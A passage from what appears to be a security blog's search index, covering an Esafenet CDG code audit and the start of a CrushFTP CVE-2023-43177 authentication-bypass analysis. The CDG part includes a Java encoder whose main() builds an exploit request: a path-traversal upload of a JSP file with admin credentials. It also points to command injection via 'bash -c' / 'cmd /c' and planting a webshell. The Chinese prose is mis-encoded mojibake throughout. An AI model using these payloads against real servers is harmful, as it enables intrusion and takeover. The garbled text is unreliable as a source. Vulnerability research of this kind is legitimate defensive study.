= var3[var14]; int var10 = T1[var6 &gt;&gt;&gt; 24 &amp; 255] ^ T2[var7 &gt;&gt;&gt; 16 &amp; 255] ^ T3[var8 &gt;&gt;&gt; 8 &amp; 255] ^ T4[var9 &amp; 255] ^ var5[0]; int var11 = T1[var7 &gt;&gt;&gt; 24 &amp; 255] ^ T2[var8 &gt;&gt;&gt; 16 &amp; 255] ^ T3[var9 &gt;&gt;&gt; 8 &amp; 255] ^ T4[var6 &amp; 255] ^ var5[1]; int var12 = T1[var8 &gt;&gt;&gt; 24 &amp; 255] ^ T2[var9 &gt;&gt;&gt; 16 &amp; 255] ^ T3[var6 &gt;&gt;&gt; 8 &amp; 255] ^ T4[var7 &amp; 255] ^ var5[2]; int var13 = T1[var9 &gt;&gt;&gt; 24 &amp; 255] ^ T2[var6 &gt;&gt;&gt; 16 &amp; 255] ^ T3[var7 &gt;&gt;&gt; 8 &amp; 255] ^ T4[var8 &amp; 255] ^ var5[3]; var6 = var10; var7 = var11; var8 = var12; var9 = var13; &#125; byte[] var15 = new byte[16]; var5 = var3[var4]; int var16 = var5[0]; var15[0] = (byte)(S[var6 &gt;&gt;&gt; 24 &amp; 255] ^ var16 &gt;&gt;&gt; 24); var15[1] = (byte)(S[var7 &gt;&gt;&gt; 16 &amp; 255] ^ var16 &gt;&gt;&gt; 16); var15[2] = (byte)(S[var8 &gt;&gt;&gt; 8 &amp; 255] ^ var16 &gt;&gt;&gt; 8); var15[3] = (byte)(S[var9 &amp; 255] ^ var16); var16 = var5[1]; var15[4] = (byte)(S[var7 &gt;&gt;&gt; 24 &amp; 255] ^ var16 &gt;&gt;&gt; 24); var15[5] = (byte)(S[var8 &gt;&gt;&gt; 16 &amp; 255] ^ var16 &gt;&gt;&gt; 16); var15[6] = (byte)(S[var9 &gt;&gt;&gt; 8 &amp; 255] ^ var16 &gt;&gt;&gt; 8); var15[7] = (byte)(S[var6 &amp; 255] ^ var16); var16 = var5[2]; var15[8] = (byte)(S[var8 &gt;&gt;&gt; 24 &amp; 255] ^ var16 &gt;&gt;&gt; 24); var15[9] = (byte)(S[var9 &gt;&gt;&gt; 16 &amp; 255] ^ var16 &gt;&gt;&gt; 16); var15[10] = (byte)(S[var6 &gt;&gt;&gt; 8 &amp; 255] ^ var16 &gt;&gt;&gt; 8); var15[11] = (byte)(S[var7 &amp; 255] ^ var16); var16 = var5[3]; var15[12] = (byte)(S[var9 &gt;&gt;&gt; 24 &amp; 255] ^ var16 &gt;&gt;&gt; 24); var15[13] = (byte)(S[var6 &gt;&gt;&gt; 16 &amp; 255] ^ var16 &gt;&gt;&gt; 16); var15[14] = (byte)(S[var7 &gt;&gt;&gt; 8 &amp; 255] ^ var16 &gt;&gt;&gt; 8); var15[15] = (byte)(S[var8 &amp; 255] ^ var16); return var15; &#125; public static byte[] blockDecrypt(byte[] var0, int var1, Object var2) &#123; int[][] var3 = (int[][])((Object[])var2)[1]; int var4 = var3.length - 1; int[] var5 = var3[0]; int var6 = ((var0[var1++] &amp; 255) &lt;&lt; 24 | (var0[var1++] &amp; 255) &lt;&lt; 16 | (var0[var1++] &amp; 255) &lt;&lt; 8 | var0[var1++] &amp; 255) ^ var5[0]; int var7 = ((var0[var1++] &amp; 255) &lt;&lt; 24 | (var0[var1++] &amp; 255) &lt;&lt; 16 | (var0[var1++] &amp; 255) &lt;&lt; 8 | var0[var1++] &amp; 255) ^ var5[1]; int var8 = ((var0[var1++] &amp; 255) &lt;&lt; 24 | (var0[var1++] &amp; 255) &lt;&lt; 16 | (var0[var1++] &amp; 255) &lt;&lt; 8 | var0[var1++] &amp; 255) ^ var5[2]; int var9 = ((var0[var1++] &amp; 255) &lt;&lt; 24 | (var0[var1++] &amp; 255) &lt;&lt; 16 | (var0[var1++] &amp; 255) &lt;&lt; 8 | var0[var1++] &amp; 255) ^ var5[3]; for(int var14 = 1; var14 &lt; var4; ++var14) &#123; var5 = var3[var14]; int var10 = T5[var6 &gt;&gt;&gt; 24 &amp; 255] ^ T6[var9 &gt;&gt;&gt; 16 &amp; 255] ^ T7[var8 &gt;&gt;&gt; 8 &amp; 255] ^ T8[var7 &amp; 255] ^ var5[0]; int var11 = T5[var7 &gt;&gt;&gt; 24 &amp; 255] ^ T6[var6 &gt;&gt;&gt; 16 &amp; 255] ^ T7[var9 &gt;&gt;&gt; 8 &amp; 255] ^ T8[var8 &amp; 255] ^ var5[1]; int var12 = T5[var8 &gt;&gt;&gt; 24 &amp; 255] ^ T6[var7 &gt;&gt;&gt; 16 &amp; 255] ^ T7[var6 &gt;&gt;&gt; 8 &amp; 255] ^ T8[var9 &amp; 255] ^ var5[2]; int var13 = T5[var9 &gt;&gt;&gt; 24 &amp; 255] ^ T6[var8 &gt;&gt;&gt; 16 &amp; 255] ^ T7[var7 &gt;&gt;&gt; 8 &amp; 255] ^ T8[var6 &amp; 255] ^ var5[3]; var6 = var10; var7 = var11; var8 = var12; var9 = var13; &#125; byte[] var15 = new byte[16]; var5 = var3[var4]; int var16 = var5[0]; var15[0] = (byte)(Si[var6 &gt;&gt;&gt; 24 &amp; 255] ^ var16 &gt;&gt;&gt; 24); var15[1] = (byte)(Si[var9 &gt;&gt;&gt; 16 &amp; 255] ^ var16 &gt;&gt;&gt; 16); var15[2] = (byte)(Si[var8 &gt;&gt;&gt; 8 &amp; 255] ^ var16 &gt;&gt;&gt; 8); var15[3] = (byte)(Si[var7 &amp; 255] ^ var16); var16 = var5[1]; var15[4] = (byte)(Si[var7 &gt;&gt;&gt; 24 &amp; 255] ^ var16 &gt;&gt;&gt; 24); var15[5] = (byte)(Si[var6 &gt;&gt;&gt; 16 &amp; 255] ^ var16 &gt;&gt;&gt; 16); var15[6] = (byte)(Si[var9 &gt;&gt;&gt; 8 &amp; 255] ^ var16 &gt;&gt;&gt; 8); var15[7] = (byte)(Si[var8 &amp; 255] ^ var16); var16 = var5[2]; var15[8] = (byte)(Si[var8 &gt;&gt;&gt; 24 &amp; 255] ^ var16 &gt;&gt;&gt; 24); var15[9] = (byte)(Si[var7 &gt;&gt;&gt; 16 &amp; 255] ^ var16 &gt;&gt;&gt; 16); var15[10] = (byte)(Si[var6 &gt;&gt;&gt; 8 &amp; 255] ^ var16 &gt;&gt;&gt; 8); var15[11] = (byte)(Si[var9 &amp; 255] ^ var16); var16 = var5[3]; var15[12] = (byte)(Si[var9 &gt;&gt;&gt; 24 &amp; 255] ^ var16 &gt;&gt;&gt; 24); var15[13] = (byte)(Si[var8 &gt;&gt;&gt; 16 &amp; 255] ^ var16 &gt;&gt;&gt; 16); var15[14] = (byte)(Si[var7 &gt;&gt;&gt; 8 &amp; 255] ^ var16 &gt;&gt;&gt; 8); var15[15] = (byte)(Si[var6 &amp; 255] ^ var16); return var15; &#125; public static synchronized Object makeKey(byte[] var0, int var1) throws InvalidKeyException &#123; if (var0 == null) &#123; throw new InvalidKeyException(&quot;Empty key&quot;); &#125; else if (var0.length != 16 &amp;&amp; var0.length != 24 &amp;&amp; var0.length != 32) &#123; throw new InvalidKeyException(&quot;Incorrect key length&quot;); &#125; else &#123; int var2 = getRounds(var0.length, var1); int var3 = var1 / 4; int[][] var4 = new int[var2 + 1][var3]; int[][] var5 = new int[var2 + 1][var3]; int var6 = (var2 + 1) * var3; int var7 = var0.length / 4; int[] var8 = new int[var7]; int var9 = 0; int var10; for(var10 = 0; var9 &lt; var7; var8[var9++] = (var0[var10++] &amp; 255) &lt;&lt; 24 | (var0[var10++] &amp; 255) &lt;&lt; 16 | (var0[var10++] &amp; 255) &lt;&lt; 8 | var0[var10++] &amp; 255) &#123; &#125; int var11 = 0; for(var10 = 0; var10 &lt; var7 &amp;&amp; var11 &lt; var6; ++var11) &#123; var4[var11 / var3][var11 % var3] = var8[var10]; var5[var2 - var11 / var3][var11 % var3] = var8[var10]; ++var10; &#125; int var13 = 0; int var12; while(var11 &lt; var6) &#123; var12 = var8[var7 - 1]; var8[0] ^= (S[var12 &gt;&gt;&gt; 16 &amp; 255] &amp; 255) &lt;&lt; 24 ^ (S[var12 &gt;&gt;&gt; 8 &amp; 255] &amp; 255) &lt;&lt; 16 ^ (S[var12 &amp; 255] &amp; 255) &lt;&lt; 8 ^ S[var12 &gt;&gt;&gt; 24 &amp; 255] &amp; 255 ^ (rcon[var13++] &amp; 255) &lt;&lt; 24; int var10001; if (var7 != 8) &#123; var9 = 1; for(var10 = 0; var9 &lt; var7; var8[var10001] ^= var8[var10++]) &#123; var10001 = var9++; &#125; &#125; else &#123; var9 = 1; for(var10 = 0; var9 &lt; var7 / 2; var8[var10001] ^= var8[var10++]) &#123; var10001 = var9++; &#125; var12 = var8[var7 / 2 - 1]; var8[var7 / 2] ^= S[var12 &amp; 255] &amp; 255 ^ (S[var12 &gt;&gt;&gt; 8 &amp; 255] &amp; 255) &lt;&lt; 8 ^ (S[var12 &gt;&gt;&gt; 16 &amp; 255] &amp; 255) &lt;&lt; 16 ^ (S[var12 &gt;&gt;&gt; 24 &amp; 255] &amp; 255) &lt;&lt; 24; var10 = var7 / 2; for(var9 = var10 + 1; var9 &lt; var7; var8[var10001] ^= var8[var10++]) &#123; var10001 = var9++; &#125; &#125; for(var10 = 0; var10 &lt; var7 &amp;&amp; var11 &lt; var6; ++var11) &#123; var4[var11 / var3][var11 % var3] = var8[var10]; var5[var2 - var11 / var3][var11 % var3] = var8[var10]; ++var10; &#125; &#125; for(int var14 = 1; var14 &lt; var2; ++var14) &#123; for(var10 = 0; var10 &lt; var3; ++var10) &#123; var12 = var5[var14][var10]; var5[var14][var10] = U1[var12 &gt;&gt;&gt; 24 &amp; 255] ^ U2[var12 &gt;&gt;&gt; 16 &amp; 255] ^ U3[var12 &gt;&gt;&gt; 8 &amp; 255] ^ U4[var12 &amp; 255]; &#125; &#125; Object[] var15 = new Object[]&#123;var4, var5&#125;; return var15; &#125; &#125; public static int getRounds(int var0, int var1) &#123; switch (var0) &#123; case 16: if (var1 == 16) &#123; return 10; &#125; else &#123; if (var1 == 24) &#123; return 12; &#125; return 14; &#125; case 24: if (var1 != 32) &#123; return 12; &#125; return 14; default: return 14; &#125; &#125; public static String getTransferUnEncrptString(String s) throws Exception &#123; byte[] abyte0 = s.getBytes(&quot;ISO8859_1&quot;); int nlength = Array.getLength(abyte0); int len = 2; byte[] result = new byte[nlength / len]; for (int i = 0; i &lt; nlength; i += len) &#123; byte bSingleCharUpper; byte byteRLower = abyte0[i]; byte byteLLower = abyte0[i + 1]; byteRLower = (byte)(byteRLower &amp; remain_low); byteRLower = (byte)(byteRLower &lt;&lt; 4); byteRLower = (byte)(byteRLower &amp; remain_up); byteLLower = (byte)(byteLLower &amp; remain_low); result[i / 2] = bSingleCharUpper = (byteLLower = (byte)(byteLLower | byteRLower)); &#125; String unencrptString = new String(result, &quot;ISO8859_1&quot;); return unencrptString; &#125; public static String getTransferEncrptString(String s) throws Exception &#123; byte[] byteTransferEncrpt = s.getBytes(&quot;ISO8859_1&quot;); int nLength = Array.getLength(byteTransferEncrpt); byte[] result = new byte[nLength * 2]; for (int i = 0; i &lt; nLength; ++i) &#123; int c; int sc = c = byteTransferEncrpt[i]; byte bUpper = (byte)(sc &gt;&gt;&gt;= 4); int bLower = c; byte bLowerChar = (byte)(bUpper &amp; remain_low); byte zero = 0; bLowerChar = bLowerChar == zero ? (byte)(bLowerChar | upper_bit_add_0101) : (byte)(bLowerChar | upper_bit_add_0100); byte cLowerChar = bLowerChar; byte bLowerChar1 = (byte)(bLower &amp; remain_low); bLowerChar1 = bLowerChar1 == zero ? (byte)(bLowerChar1 | upper_bit_add_0101) : (byte)(bLowerChar1 | upper_bit_add_0100); byte cLowerChar1 = bLowerChar1; result[i * 2] = cLowerChar; result[i * 2 + 1] = cLowerChar1; &#125; String encrptString = new String(result, &quot;ISO8859_1&quot;); return encrptString; &#125; public static String encode(String str) throws Exception &#123; byte[] abyte1 = str.getBytes(); int nLength = Array.getLength(abyte1); encode((byte[])abyte1, (int)nLength, (byte[])key2); String src = new String(abyte1, &quot;ISO8859_1&quot;); return getTransferEncrptString((String)src); &#125; public static void encode(byte[] abyte1, int nLength, byte[] abyte0) throws Exception &#123; int groupsLen = 16 * (nLength / 16); Object obj = makeKey((byte[])abyte0); encrypt((byte[])abyte1, (byte[])abyte1, (int)groupsLen, (Object)obj); if (groupsLen != nLength) &#123; int nLeft = nLength - groupsLen; for (int i = 0; i &lt; nLeft; ++i) &#123; int n = groupsLen + i; abyte1[n] = (byte)(abyte1[n] ^ i); &#125; &#125; &#125; public static String decode(String info) &#123; try &#123; info = getTransferUnEncrptString((String)info); byte[] abyte2 = info.getBytes(&quot;ISO8859_1&quot;); int nLength = Array.getLength(abyte2); decode((byte[])abyte2, (int)nLength, (byte[])key2); info = new String(abyte2); return info; &#125; catch (Exception ex) &#123; return info; &#125; &#125; public static void decode(byte[] abyte1, int nLength, byte[] abyte0) throws Exception &#123; int groupsLen = 16 * (nLength / 16); Object obj = makeKey((byte[])abyte0); decrypt((byte[])abyte1, (byte[])abyte1, (int)groupsLen, (Object)obj); if (groupsLen != nLength) &#123; int nLeft = nLength - groupsLen; for (int i = 0; i &lt; nLeft; ++i) &#123; int n = groupsLen + i; abyte1[n] = (byte)(abyte1[n] ^ i); &#125; &#125; &#125; public static void encrypt(byte[] in, byte[] result, int n, Object obj) throws Exception &#123; byte[] abyte = new byte[16]; byte[] abyte0 = new byte[16]; if (0 == n) &#123; return; &#125; for (int i = 0; i &lt; n / 16; ++i) &#123; System.arraycopy(in, i * 16, abyte, 0, 16); abyte0 = blockEncrypt((byte[])abyte, (int)0, (Object)obj); System.arraycopy(abyte0, 0, result, i * 16, 16); &#125; &#125; public static void decrypt(byte[] in, byte[] result, int n, Object obj) throws Exception &#123; byte[] abyte = new byte[16]; byte[] abyte0 = new byte[16]; if (0 == n) &#123; return; &#125; for (int i = 0; i &lt; n / 16; ++i) &#123; System.arraycopy(in, i * 16, abyte, 0, 16); abyte0 = blockDecrypt((byte[])abyte, (int)0, (Object)obj); System.arraycopy(abyte0, 0, result, i * 16, 16); &#125; &#125; public static void main(String[] args) throws Exception&#123; System.out.println(encode(&quot;&#123;\\&quot;totalSize\\&quot;:196,\\&quot;offset\\&quot;:\\&quot;0\\&quot;,\\&quot;loginName\\&quot;:\\&quot;y4loveyou\\&quot;,\\&quot;filePath\\&quot;:\\&quot;./../../../../../../../../esafenet/CdgWeb/CDGServer3/3g/y4test.jsp\\&quot;,\\&quot;userName\\&quot;:\\&quot;admin\\&quot;,\\&quot;pwd\\&quot;:\\&quot;admin@123\\&quot;,\\&quot;type\\&quot;:\\&quot;1\\&quot;,\\&quot;timestamp\\&quot;:1702496085&#125;&quot;)); &#125;&#125; åè¯çœ‹éƒ½çœ‹äº†ä¸å¦‚å¤šçœ‹ä¸€ç‚¹ï¼Œå¯¹äºMogDbController,è™½ç„¶è·¯ç”±ä¸‹å¾ˆå¤šæ‰§è¡Œå‘½ä»¤çš„åŠŸèƒ½ç‚¹ ä½†æ˜¯ä»”ç»†çœ‹æ‰§è¡Œçš„åœ°æ–¹ï¼Œå› ä¸ºJavaå‘½ä»¤æ‰§è¡Œå‚æ•°åŒ–çš„åŸå› ï¼Œè¿™é‡Œæ²¡åŠæ³•æ³¨å…¥å…¶ä»–å‘½ä»¤ï¼Œå¯æƒœäº†è¿™é‡Œè¯¥æ˜¯æœ‰å›æ˜¾çš„ ä½†æ˜¯çœ‹å¦ä¸€ä¸ªè·¯ç”±com.esafenet.fileserver.controller.DataBaseController#backrestore çœ‹åˆ°Bash -cä»¥åŠcmd /cä¹Ÿå°±æ”¾å¿ƒäº†ï¼ŒåŒæ—¶å¦‚æœä¸å‡ºç½‘æˆ‘ä»¬ä¹Ÿå¯ä»¥æŠŠç»“æœå†™åˆ°CDGServer3ä¸‹ç›´æ¥è®¿é—®å³å¯ï¼Œä¹Ÿæˆ–è€…å†™ä¸ªé©¬åˆ°CDGServer3ä¸‹ï¼Œæ–¹æ³•æ¯”è¾ƒå¤šå°±ä¸è¯´äº†","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"https://y4tacker.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"CrushFTP Unauthenticated Remote Code Execution(CVE-2023-43177)","slug":"year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177","date":"2023-12-10T13:04:09.000Z","updated":"2024-08-04T09:01:49.794Z","comments":true,"path":"2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/","link":"","permalink":"https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/","excerpt":"","text":"CrushFTP Unauthenticated Remote Code Executionè·¯ç”±åˆ†æä¸åƒä¼ ç»Ÿå¥—ä»¶ï¼Œè¿™é‡Œè‡ªå·±å®ç°äº†åè®®çš„è§£æå¹¶åšè°ƒç”¨ï¼Œå†™æ³•æ¯”è¾ƒæ­»æ¿ï¼Œä¸å¤Ÿçµæ´»ï¼Œåœ¨crushftp.server.ServerSessionHTTPå¯ä»¥çœ‹åˆ°å…·ä½“çš„å¤„ç†è¿‡ç¨‹ï¼Œä»£ç â€ä¾æ‰˜ç­”è¾©â€ï¼Œä¸è¿‡æ¼æ´æ€è·¯å€¼å¾—å­¦ä¹  å‰å°æƒé™ç»•è¿‡ç®€å•æ¥è¯´ï¼ŒåŸç†æ˜¯å› ä¸ºç¨‹åºå®ç°å­˜åœ¨åŒ¿åè®¿é—®æœºåˆ¶ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡headeræ±¡æŸ“å½“å‰ä¼šè¯çš„å‚æ•°å¯¼è‡´äº§ç”Ÿäº†ä¸€äº›æ„å¤–çš„æ“ä½œ åœ¨crushftp.server.ServerSessionAJAX#buildPostItemå½“ä¸­ï¼Œå¯ä»¥çœ‹åˆ°ä¼šè§£ææ¯ä¸€ä¸ªheaderï¼Œå¹¶å°†è§£æåˆ°çš„key,valä¿å­˜åˆ°as2Infoè¿™ä¸ªPropertiesä¸­ï¼ŒåŒæ—¶è¿™é‡Œå¯¹putçš„å‚æ•°æ²¡æœ‰ä»»ä½•é™åˆ¶ 1234567891011121314151617public boolean buildPostItem(Properties request, long http_len_max, Vector headers, String req_id) throws Exception &#123; Properties as2Info = new Properties(); boolean write100Continue = false; int x = 1;s while (x &lt; headers.size()) &#123; String data; String key = data = headers.elementAt(x).toString(); String val = &quot;&quot;; try &#123; val = data.substring(data.indexOf(&quot;:&quot;) + 1).trim(); key = data.substring(0, data.indexOf(&quot;:&quot;)).trim().toLowerCase(); &#125; catch (Exception e) &#123; Log.log(&quot;HTTP_SERVER&quot;, 3, e); &#125; as2Info.put(key, val); ......çœç•¥..... æˆ‘ä»¬é¡ºä¾¿çœ‹çœ‹æ–°ç‰ˆæœ¬æ˜¯å¦‚ä½•è§£å†³è¿™ä¸€ç‚¹çš„ï¼Œä»processAs2HeaderLineå¯ä»¥çœ‹å‡ºï¼Œå…è®¸è®¾ç½®åˆ°as2Infoå½“ä¸­å€¼å—åˆ°äº†é™åˆ¶ 12345678910111213141516public static void processAs2HeaderLine(String key, String val, String data, Properties as2Info) &#123; as2Info.put(key.trim().toLowerCase(), val.trim()); if (data.toLowerCase().startsWith(&quot;message-id:&quot;)) &#123; String as2Filename = data.substring(data.indexOf(&quot;:&quot;) + 1).trim(); if ((as2Filename = as2Filename.substring(1)).indexOf(&quot;@&quot;) &gt;= 0) &#123; as2Filename = as2Filename.substring(0, as2Filename.indexOf(&quot;@&quot;)); &#125; as2Filename = Common.replace_str(as2Filename, &quot;&lt;&quot;, &quot;&quot;); as2Filename = Common.replace_str(as2Filename, &quot;&gt;&quot;, &quot;&quot;); as2Info.put(&quot;as2Filename&quot;, as2Filename); &#125; else if (data.toLowerCase().startsWith(&quot;content-type:&quot;)) &#123; as2Info.put(&quot;contentType&quot;, data.substring(data.indexOf(&quot;:&quot;) + 1).trim()); &#125; else if (data.toLowerCase().startsWith(&quot;disposition-notification-options:&quot;)) &#123; as2Info.put(&quot;signMdn&quot;, String.valueOf(data.substring(data.indexOf(&quot;:&quot;) + 1).trim().indexOf(&quot;pkcs7-signature&quot;) &gt;= 0)); &#125; &#125; ç»§ç»­å¾€ä¸‹æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œåœ¨å…‰æ ‡å¤„æ²¡æœ‰åšä»»ä½•çš„é™åˆ¶ï¼Œç›´æ¥å°†as2Infoä¸­çš„æ¯ä¸ªé”®å€¼å¯¹æ·»åŠ åˆ°äº†å½“å‰ä¼šè¯çš„user_infoå±æ€§ï¼Œå› æ­¤è¿™é‡Œå­˜åœ¨ä¸€ä¸ªå±æ€§è¦†ç›–çš„é—®é¢˜ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±éœ€è¦çœ‹çœ‹è¦†ç›–å“ªäº›å±æ€§å¯èƒ½å­˜åœ¨å¨èƒ å…³äºuser_infoå±æ€§çš„è·å–æ˜¯é€šè¿‡ä¸€ä¸ªå°è£…å¥½çš„å‡½æ•°æ¥åšè·å– 123456public String uiSG(String data) &#123; if (this.user_info.containsKey(data)) &#123; return this.user_info.getProperty(data); &#125; return &quot;&quot;;&#125; åŒæ—¶åœ¨æ­¤åŸºç¡€ä¸Šè¿˜æœ‰ä¸€ç³»åˆ—ç±»å‹è½¬æ¢çš„å°è£… 12345678910111213141516171819202122public int uiIG(String data) &#123; try &#123; return Integer.parseInt(this.uiSG(data)); &#125; catch (Exception exception) &#123; return 0; &#125;&#125;public long uiLG(String data) &#123; try &#123; return Long.parseLong(this.uiSG(data)); &#125; catch (Exception exception) &#123; return 0L; &#125;&#125;public boolean uiBG(String data) &#123; return this.uiSG(data).toLowerCase().equals(&quot;true&quot;);&#125;...... æ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾æ±¡æŸ“å“ªäº›å±æ€§å¯èƒ½é€ æˆå±å®³ï¼Œè¿™é‡Œæ¼æ´å‘ç°è€…ä½¿ç”¨äº†getUserName å…¶ä¸­csrfé»˜è®¤ä¸ºtrueï¼Œæˆ‘ä»¬éœ€è¦ä¼ å…¥c2få‚æ•° 123456789101112131415161718192021222324public boolean getUserName(Properties request) throws Exception &#123; if (request.getProperty(&quot;command&quot;, &quot;&quot;).equalsIgnoreCase(&quot;getUserName&quot;)) &#123; String response = &quot;&lt;?xml version=\\&quot;1.0\\&quot; encoding=\\&quot;UTF-8\\&quot;?&gt; \\r\\n&quot;; if (ServerStatus.BG(&quot;csrf&quot;) &amp;&amp; !request.getProperty(&quot;c2f&quot;, &quot;&quot;).equals(&quot;&quot;)) &#123; String session_id = this.thisSessionHTTP.thisSession.getId(); try &#123; if (!request.getProperty(&quot;c2f&quot;, &quot;&quot;).equalsIgnoreCase(session_id.substring(session_id.length() - 4))) &#123; this.thisSessionHTTP.thisSession.uiVG(&quot;failed_commands&quot;).addElement(&quot;&quot; + new Date().getTime()); response = String.valueOf(response) + &quot;&lt;commandResult&gt;&lt;response&gt;FAILURE:Access Denied. (c2f)&lt;/response&gt;&lt;/commandResult&gt;&quot;; return this.writeResponse(response); &#125; &#125; catch (Exception e) &#123; Log.log(&quot;HTTP_SERVER&quot;, 2, e); this.thisSessionHTTP.thisSession.uiVG(&quot;failed_commands&quot;).addElement(&quot;&quot; + new Date().getTime()); response = String.valueOf(response) + &quot;&lt;loginResult&gt;&lt;response&gt;failure&lt;/response&gt;&lt;/loginResult&gt;&quot;; return this.writeResponse(response); &#125; &#125; response = this.thisSessionHTTP.thisSession.uiBG(&quot;user_logged_in&quot;) &amp;&amp; !this.thisSessionHTTP.thisSession.uiSG(&quot;user_name&quot;).equals(&quot;&quot;) ? String.valueOf(response) + &quot;&lt;loginResult&gt;&lt;response&gt;success&lt;/response&gt;&lt;username&gt;&quot; + this.thisSessionHTTP.thisSession.uiSG(&quot;user_name&quot;) + &quot;&lt;/username&gt;&lt;/loginResult&gt;&quot; : String.valueOf(response) + &quot;&lt;loginResult&gt;&lt;response&gt;failure&lt;/response&gt;&lt;/loginResult&gt;&quot;; return this.writeResponse(response); &#125; return false;&#125; å¦‚æœç›¸ç­‰åˆ™è¿”å›ç™»å½•æˆåŠŸï¼ŒåŒæ—¶å€¼å¾—æ³¨æ„çš„æ˜¯è¿™é‡Œä¼šè¿”å›user_nameï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥åˆ¤æ–­æ¼æ´æ˜¯å¦å¯åˆ©ç”¨ï¼Œå¦‚æœæ˜¯æ¼æ´ç‰ˆæœ¬user_nameå°±å¯ä»¥é€šè¿‡headerè¦†ç›–ï¼Œè¿”å›ä¹Ÿå¯ä»¥æ˜¯ä»»æ„å¯æ§å­—ç¬¦ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980public boolean writeResponse(String response) throws Exception &#123; return this.writeResponse(response, true, 200, true, false, true);&#125;public boolean writeResponse(String response, boolean json) throws Exception &#123; return this.writeResponse(response, true, 200, true, json, true);&#125;public boolean writeResponse(String response, boolean log, int code, boolean convertVars, boolean json, boolean log_header) throws Exception &#123; boolean acceptsGZIP = false; return this.writeResponse(response, log, code, convertVars, json, acceptsGZIP, log_header);&#125;public boolean writeResponse(String response, boolean log, int code, boolean convertVars, boolean json, boolean acceptsGZIP, boolean log_header) throws Exception &#123; if (convertVars) &#123; response = ServerStatus.thisObj.change_vars_to_values(response, this.thisSessionHTTP.thisSession); &#125; this.write_command_http(&quot;HTTP/1.1 &quot; + code + &quot; OK&quot;, log_header); this.write_command_http(&quot;Cache-Control: no-store&quot;, log_header); this.write_command_http(&quot;Pragma: no-cache&quot;, log_header); if (json) &#123; this.write_command_http(&quot;Content-Type: application/jsonrequest;charset=utf-8&quot;); &#125; else &#123; this.write_command_http(&quot;Content-Type: text/&quot; + (response.indexOf(&quot;&lt;?xml&quot;) &gt;= 0 ? &quot;xml&quot; : &quot;plain&quot;) + &quot;;charset=utf-8&quot;); &#125; if (acceptsGZIP) &#123; this.thisSessionHTTP.write_command_http(&quot;Vary: Accept-Encoding&quot;); this.thisSessionHTTP.write_command_http(&quot;Content-Encoding: gzip&quot;); this.thisSessionHTTP.write_command_http(&quot;Transfer-Encoding: chunked&quot;); this.thisSessionHTTP.write_command_http(&quot;Date: &quot; + this.thisSessionHTTP.sdf_rfc1123.format(new Date()), log, true); this.thisSessionHTTP.write_command_http(&quot;Server: &quot; + ServerStatus.SG(&quot;http_server_header&quot;), log, true); this.thisSessionHTTP.write_command_http(&quot;P3P: CP=\\&quot;IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT\\&quot;&quot;, log, true); if (!ServerStatus.SG(&quot;Access-Control-Allow-Origin&quot;).equals(&quot;&quot;)) &#123; String origin = this.thisSessionHTTP.headerLookup.getProperty(&quot;ORIGIN&quot;, &quot;&quot;); int x = 0; while (x &lt; ServerStatus.SG(&quot;Access-Control-Allow-Origin&quot;).split(&quot;,&quot;).length) &#123; boolean ok = false; if (origin.equals(&quot;&quot;)) &#123; ok = true; &#125; else if (ServerStatus.SG(&quot;Access-Control-Allow-Origin&quot;).split(&quot;,&quot;)[x].toUpperCase().trim().equalsIgnoreCase(origin.toUpperCase().trim())) &#123; ok = true; &#125; if (ok) &#123; this.write_command_http(&quot;Access-Control-Allow-Origin: &quot; + ServerStatus.SG(&quot;Access-Control-Allow-Origin&quot;).split(&quot;,&quot;)[x].trim()); &#125; ++x; &#125; this.write_command_http(&quot;Access-Control-Allow-Headers: authorization,content-type&quot;); this.write_command_http(&quot;Access-Control-Allow-Credentials: true&quot;); this.write_command_http(&quot;Access-Control-Allow-Methods: GET,POST,OPTIONS,PUT,PROPFIND,DELETE,MKCOL,MOVE,COPY,HEAD,PROPPATCH,LOCK,UNLOCK,ACL,TR&quot;); &#125; this.write_command_http(&quot;&quot;, log); ByteArrayOutputStream baos = new ByteArrayOutputStream(); byte[] b = response.getBytes(&quot;UTF8&quot;); GZIPOutputStream out = new GZIPOutputStream(baos); ((OutputStream)out).write(b); out.finish(); if (baos.size() &gt; 0) &#123; this.thisSessionHTTP.original_os.write((String.valueOf(Long.toHexString(baos.size())) + &quot;\\r\\n&quot;).getBytes()); baos.writeTo(this.thisSessionHTTP.original_os); this.thisSessionHTTP.original_os.write(&quot;\\r\\n&quot;.getBytes()); baos.reset(); &#125; this.thisSessionHTTP.original_os.write(&quot;0\\r\\n\\r\\n&quot;.getBytes()); this.thisSessionHTTP.original_os.flush(); &#125; else &#123; this.thisSessionHTTP.write_standard_headers(log); int len = response.getBytes(&quot;UTF8&quot;).length + 2; if (len == 2) &#123; len = 0; &#125; this.write_command_http(&quot;Content-Length: &quot; + len, log_header); this.write_command_http(&quot;&quot;, log); if (len &gt; 0) &#123; this.thisSessionHTTP.write_command_http(response, log, convertVars); &#125; &#125; this.thisSessionHTTP.thisSession.drain_log(); return true;&#125; å½“è¯·æ±‚ç»“æŸï¼Œåœ¨å“åº”å®Œæˆä¹‹åï¼Œåœ¨å€’æ•°ç¬¬äºŒè¡Œè°ƒç”¨äº†drain_logæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•ä¹Ÿå¾ˆæœ‰æ„æ€ 